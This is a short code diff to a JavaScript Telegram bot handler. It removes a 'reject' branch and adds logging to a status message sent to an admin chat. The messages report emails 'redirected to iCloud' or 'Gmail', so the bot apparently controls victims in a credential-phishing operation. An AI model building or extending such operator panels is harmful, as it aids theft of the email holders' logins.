@@ -110,22 +110,26 @@ bot.on("callback_query", async (query) => {
         statusMessage = `☁️ <code>${email}</code> redirected to <b>iCloud</b>! ✅`;
       } else if (action === "redirect_gmail") {
         statusMessage = `🌈 <code>${email}</code> redirected to <b>Gmail</b>! ✅`;
-      } else if (action === "reject") {
-        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       }
 
-      try {
-        const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await fetch(replyUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: ADMIN_CHAT_ID,
-            text: statusMessage,
-            parse_mode: "HTML"
-          })
-        });
-      } catch (err) {}
+      // ✅ SEND THE MESSAGE
+      if (statusMessage) {
+        try {
+          const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          await fetch(replyUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID,
+              text: statusMessage,
+              parse_mode: "HTML"
+            })
+          });
+          console.log(`✅ Sent message: ${statusMessage}`);
+        } catch (err) {
+          console.error(`❌ Failed to send status message:`, err);
+        }
+      }
     }
 
     bot.answerCallbackQuery(callbackId, {
